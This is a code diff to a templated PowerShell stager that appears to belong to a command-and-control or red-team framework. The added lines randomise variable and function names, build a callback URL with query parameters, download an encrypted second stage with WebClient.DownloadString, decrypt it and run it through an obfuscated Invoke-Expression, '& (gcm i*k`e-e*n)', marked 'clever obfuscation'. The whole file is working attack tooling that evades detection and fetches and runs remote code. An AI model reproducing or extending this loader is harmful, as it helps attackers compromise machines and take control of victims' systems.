@@ -29,18 +29,21 @@ if ($PSVersionTable.PSVersion.Major -ge 5) {
 
 
 {% if transport in ['http', 'https'] %}
-    $WebClient = $K{# defined in the launcher #}
+    ${{symbol_name("WebClient")}} = $K{# defined in the launcher #}
     function {{symbol_name("Transport-String")}} {
-        return {{symbol_name("Decrypt-String")}} ($WebClient.DownloadString(${{symbol_name("CALLBACK_URL")}}+'{{stage2}}'))
-}
+        param([String]$1, [hashtable]$2)
+        $args = "?t={{transport}}"
+        foreach($k in $2.keys) { $args += "&$k=$($2[$k])" }
+        return {{symbol_name("Decrypt-String")}} (${{symbol_name("WebClient")}}.DownloadString("${{symbol_name("CALLBACK_URL")}}${1}${args}"))
+    }
 {% elif transport == 'smb' %}
     {# TODO #}
 {% elif transport == 'dns' %}
     {# TODO #}
 {% endif %}
 
-$code = {{symbol_name("Transport-String")}}
+${{symbol_name("Code")}} = {{symbol_name("Transport-String")}} "{{stage2}}"
 
 {#clever obfuscation#}
-& (gcm i*k`e-e*n) $code
+& (gcm i*k`e-e*n) ${{symbol_name("Code")}}
 {{exec_clipboard_entry}}
